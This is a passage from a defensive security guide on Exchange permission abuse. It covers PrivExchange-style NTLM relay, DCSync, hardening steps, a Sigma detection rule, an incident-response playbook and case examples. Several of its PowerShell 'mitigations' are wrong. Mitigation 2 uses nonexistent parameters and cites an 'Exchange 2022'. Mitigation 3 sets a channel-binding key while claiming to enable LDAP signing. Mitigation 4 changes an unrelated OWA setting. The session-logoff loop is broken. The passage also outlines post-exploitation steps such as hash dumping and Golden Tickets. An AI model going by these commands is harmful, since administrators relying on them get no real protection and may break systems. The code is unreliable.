- **Recommendation:** Use **Split Permissions** model (separates AD admin from Exchange admin).
- Microsoft support statement: This is a supported configuration.

---

### Mitigation 2: Implement Split Permissions Model (Recommended by Microsoft)

**Objective:** Separate Active Directory administration from Exchange administration.

**PowerShell Configuration:**
```powershell
# Enable Split Permissions (requires Exchange Management Shell on Exchange server)

# Step 1: Create custom RBAC role groups for Exchange-only admins
New-RoleGroup -Name "Exchange Admins (Non-AD)" -Roles `
  "Organization Management", `
  "Recipient Management", `
  "Records Management"

# Step 2: Remove organizational-level permissions from Exchange
Remove-RoleAssignment -Identity "Organization Management" -RoleType OrganizationManagement

# Step 3: Create Split Permissions between AD and Exchange
Set-AdPermission -Identity "CN=Microsoft Exchange System Objects,CN=Users,DC=domain,DC=local" `
  -User "DOMAIN\Exchange Servers" -ExchangeRemoveObjectAccess
```

**Supported Versions:**
- Exchange 2013, 2016, 2019, 2022

**Documentation:**
- [Microsoft: Understanding Split Permissions](https://learn.microsoft.com/en-us/exchange/understanding-split-permissions-exchange-2013-help)

---

### Mitigation 3: Enable LDAP Signing & Channel Binding (Prevents Relay)

**Objective:** Prevent NTLM relay attacks to LDAP by enforcing LDAP signing.

**Method A: Group Policy (Domain Level)**
1. Open **Group Policy Management** (gpmc.msc).
2. Edit the **Default Domain Policy** (or create new Policy for DCs).
3. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**.
4. Set **Domain controller: LDAP server signing requirements** to **Require signing**.
5. Set **Network security: LDAP client signing requirements** to **Require signing**.
6. Apply and reboot all Domain Controllers.

**Method B: Registry (Direct on DC)**
```powershell
# On Domain Controller, enable LDAP Signing
reg add "HKLM\System\CurrentControlSet\Services\NTDS\Parameters" `
  /v "LdapEnforceChannelBinding" /t REG_DWORD /d 2 /f

# Requires DC reboot
Restart-Computer -Force
```

**Impact:**
- **High impact:** Older applications may fail LDAP binds.
- Thoroughly test before production deployment.
- No impact on modern applications (Exchange 2013+, Windows Server 2012+).

**Supported Versions:**
- Windows Server 2008 R2 - 2025

---

### Mitigation 4: Disable PushSubscription Feature (In Exchange)

**Objective:** Disable the Exchange PushSubscription feature that allows external URL registration (used in PrivExchange attack).

**PowerShell Command (Exchange Management Shell):**
```powershell
# Disable push notifications
Set-OwaVirtualDirectory -Identity "servername\owa (Default Web Site)" -AllowWebReadyDocumentViewing $false

# Or globally disable external push subscriptions
Set-OrganizationConfig -ExternalPushNotificationUrl $null
```

**Supported Versions:**
- Exchange 2013, 2016, 2019

---

### Mitigation 5: Restrict NTLM Authentication (Network Level)

**Objective:** Disable NTLM authentication on critical services, forcing Kerberos use.

**Group Policy:**
1. **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**.
2. Set **Network security: Do not store LAN Manager hash value on next password change** to **Enabled**.
3. Set **Network Security: Minimum session security for NTLM SSP (including secure RPC)** to **Require NTLMv2 session security**.
4. Set **Network security: Restrict NTLM: NTLM authentication in this domain** to **Deny all**.

**Impact:**
- May break legacy applications using NTLM.
- Modern environments should migrate to Kerberos / Modern Auth.

---

### Mitigation 6: Enable Privileged Access Workstation (PAW) for Admins

**Objective:** Restrict domain admin and Exchange admin access to hardened, isolated machines.

**Implementation:**
- Create isolated subnet/VLAN for PAW devices.
- Multi-factor authentication (MFA) mandatory for all admin accounts.
- No internet browsing or external email on PAW devices.
- All admin actions logged and monitored.

**Tools:**
- [Microsoft PAW Implementation Guide](https://learn.microsoft.com/en-us/security/privileged-access-workstations/privileged-access-deployment)

---

### Mitigation 7: Monitor for Unusual DCSync Attempts

**Objective:** Alert on any DCSync operations by non-DC accounts.

**Sigma Rule (for SIEM):**
```yaml
title: Suspicious DCSync Operation
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4662
    ObjectName|contains: "Replication"
    AccessMask|contains: "DS-Replication"
    Account|notequals:
      - "*$" # Exclude DC computer accounts
  filter:
    Account|startswith: "DOMAIN\\DC"
  condition: selection and not filter
falsepositives:
  - Legitimate replication between Exchange and Azure AD
level: high
```

---

## 15. DETECTION & INCIDENT RESPONSE

### Detection Strategy

**Phase 1: Real-Time Detection (During Attack)**
- Monitor NTLM relay activity on LDAP (port 389/636).
- Alert on PushSubscription creation in Exchange audit logs.
- Flag unusual Exchange EWS authentication patterns.

**Phase 2: Post-Attack Detection (After Compromise)**
- Review DACL modifications on domain object (Event ID 5136).
- Identify newly granted DCSync rights on unexpected accounts.
- Analyze DCSync operations (Event ID 4662, 5723).

---

### Incident Response Playbook

**Step 1: Immediate Containment (First Hour)**
```powershell
# Disable the compromised user account
Disable-ADAccount -Identity "attacker_user"

# Force logoff all sessions
Get-ADUser -Identity "attacker_user" | ForEach-Object {
    # Terminate RDP sessions
    quser | Where-Object { $_ -match $_.SamAccountName } | ForEach-Object {
        # Extract session ID and logoff
        $sessionID = $_.Split()[2]
        logoff $sessionID /server:computername /v
    }
}

# Reset password for all domain admins (force re-authentication)
Get-ADGroupMember -Identity "Domain Admins" | ForEach-Object {
    $newPassword = ([System.Web.Security.Membership]::GeneratePassword(16, 3))
    Set-ADAccountPassword -Identity $_.DistinguishedName -NewPassword (ConvertTo-SecureString $newPassword -AsPlainText -Force) -Reset
    Write-Host "Reset password for $($_.SamAccountName)"
}
```

**Step 2: Evidence Collection (Hour 1-2)**
```powershell
# Export all recent DACL changes
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 5136
    StartTime = (Get-Date).AddHours(-24)
} | Export-Csv -Path "C:\Incident\DACL_Changes.csv" -NoTypeInformation

# Export DCSync attempts
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4662
    StartTime = (Get-Date).AddHours(-24)
} | Export-Csv -Path "C:\Incident\DCSync_Attempts.csv" -NoTypeInformation

# Export NTLM relay evidence from network
Get-NetTCPConnection -State Established | Where-Object { $_.RemotePort -eq 389 } | 
  Export-Csv -Path "C:\Incident\Network_Connections.csv" -NoTypeInformation
```

**Step 3: Root Cause Analysis (Hour 2-4)**
1. Determine which user account was compromised.
2. Identify if PrivExchange was used (check for PushSubscription creation in Exchange logs).
3. Check which DCSync operations were performed (analyze Event ID 5723).
4. Determine scope of data exfiltration (which password hashes were dumped).

**Step 4: Remediation (Hour 4-8)**
1. Restore domain ACL from backup (or manually remove malicious ACEs).
2. Force password reset for all user accounts (not just admins if DCSync was used).
3. Reset krbtgt password twice (invalidates all Kerberos tickets).
4. Change Exchange service account password.
5. Review and re-apply least-privilege RBAC for Exchange administrators.

**Step 5: Prevention & Hardening (Ongoing)**
- Implement Mitigation strategies listed above.
- Deploy PAW for administrators.
- Enable MFA for all sensitive accounts.
- Implement LDAP signing on all Domain Controllers.
- Regular pentesting to verify fixes.

---

## 16. RELATED ATTACK CHAIN

### Pre-Exploitation Requirements
- **Reconnaissance:** BloodHound enumeration, ACL discovery (Mitigation: Restrict enumeration via Group Policy).
- **Initial Access:** Valid mailbox credentials (from phishing, credential spray, or prior breach).

### Post-Exploitation Objectives
- **DCSync Execution:** Extract all domain password hashes.
- **Lateral Movement:** Use stolen hashes via Pass-the-Hash to compromise Domain Controllers, server infrastructure.
- **Persistence:** Create Golden Tickets, establish backdoor access.
- **Data Exfiltration:** Access sensitive data via compromised admin credentials.

### Defense Evasion Techniques
- NTLM relay avoids many detection mechanisms (no plaintext passwords transmitted).
- In-memory execution via Mimikatz avoids disk-based detection.
- Off-hours execution reduces SOC visibility.
- **Mitigation:** 24/7 monitoring, behavioral analytics, anomaly detection.

---

## 17. REAL-WORLD EXAMPLES

### Example 1: Exchange Hybrid Environment (CVE-2025-53786)

**Scenario:** Organization with hybrid Exchange (on-premises + Exchange Online).

**Attack Timeline:**
1. Attacker compromises user mailbox via phishing.
2. Attacker gains Exchange server admin access (prior lateral movement or supply chain compromise).
3. Attacker abuses shared service principal between on-premises and cloud environments.
4. Attacker extracts access tokens valid for 24 hours.
5. Attacker escalates to Exchange Online tenant admin and Microsoft 365 global admin.

**Impact:** Full compromise of both on-premises AD and Microsoft 365 tenant.

**Detection & Response:**
- Microsoft Defender for Identity detected unusual DCSync activity.
- Azure AD security logs showed service principal token abuse.
- Response: Isolate Exchange servers, reset all admin passwords, audit M365 audit logs for suspicious activity.

---

### Example 2: PrivExchange Attack (Mollema, 2019)

**Scenario:** Mid-sized organization with Exchange 2016 deployed.

**Attack Timeline:**
1. Attacker performs user enumeration and targets low-privileged user account.
2. Attacker gains credentials via credential spray attack.
3. Attacker runs PrivExchange from external machine, targeting Exchange server.
4. Exchange server authenticates to attacker's NTLM relay listener (via PushSubscription).
5. Relay forwards authentication to Domain Controller's LDAP service.
6. Attacker escalates compromised user to DCSync privileges.
7. Attacker dumps all domain password hashes within seconds.

**Impact:** Domain administrator compromise within minutes of initial user account breach.

**Detection & Response:**
- Intrusion Prevention System (IPS) detected NTLM relay traffic pattern.
- Windows event logs (Event ID 5136) showed ACL modification on domain object.
- Response: Isolate Exchange servers, revoke all Kerberos tickets, force password reset for all users.

---

### Example 3: Post-Compromise Discovery (Incident Response Case)

**Scenario:** Forensic investigation after ransomware attack reveals Exchange ACL abuse.

**Discovery:**
- Ransomware attributed to threat actor who dumped all domain password hashes days before encryption.
- Investigation found malicious ACE on domain object granting DCSync rights to a service account.
- Account had been in this elevated state for 3+ days before ransomware.

**Timeline (Reconstructed):**
- Day 1: Service account compromised via phishing.
- Day 2: ACL abuse attack executed; domain hashes extracted.
- Day 3: Lateral movement to backup servers, credential theft.
- Day 4: Ransomware distributed across all systems using compromised admin credentials.

**Lessons Learned:**
- Failed to monitor DACL changes on domain object.
- ACL modification event (5136) was enabled but not alerted.
- Exchange permissions were never reviewed or hardened.
- No privileged access workstation (PAW) in place for admins.

---

## References & Authoritative Sources

1. **PrivExchange Original Research**
   - [Dirk-Jan Mollema: "Abusing Exchange: One API call away from Domain Admin"](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)

2. **CVE-2021-42287 (Computer Account Quota Abuse)**
   - [Microsoft Security Update](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287)

3. **Exchange Permissions & RBAC**
   - [Microsoft: Understanding RBAC in Exchange Server](https://learn.microsoft.com/en-us/exchange/understanding-rbac-exchange-2013-help)
   - [Microsoft: Split Permissions](https://learn.microsoft.com/en-us/exchange/understanding-split-permissions-exchange-2013-help)

4. **ACL Abuse Techniques**
   - [The Hacker Recipes: Grant Rights (WriteDACL)](https://www.thehacker.recipes/ad/movement/dacl/grant-rights)
   - [Fox-IT: Escalating Privileges with ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)

5. **NTLM Relay & LDAP Abuse**
   - [Praetorian: LDAP Relaying Attacks](https://www.praetorian.com/blog/how-to-exploit-active-directory-acl-attack-paths-through-ldap-relaying-attacks/)
   - [Impacket Documentation](https://github.com/fortra/impacket)

6. **MITRE ATT&CK**
   - [T1078.002: Valid Accounts - Domain Accounts](https://attack.mitre.org/techniques/T1078/002/)
   - [T1098: Account Manipulation](https://attack.mitre.org/techniques/T1098/)

7. **Defensive Mitigations**
   - [Trimarc: Mitigating Exchange Permission Paths to Domain Admins](https://www.trimarcsecurity.com/hub-post/mitigating-exchange-permission-paths-to-domain-admins-in-active-directory)
   - [Microsoft: Privileged Access Workstations (PAW)](https://learn.microsoft.com/en-us/security/privileged-access-workstations/privileged-access-deployment)

---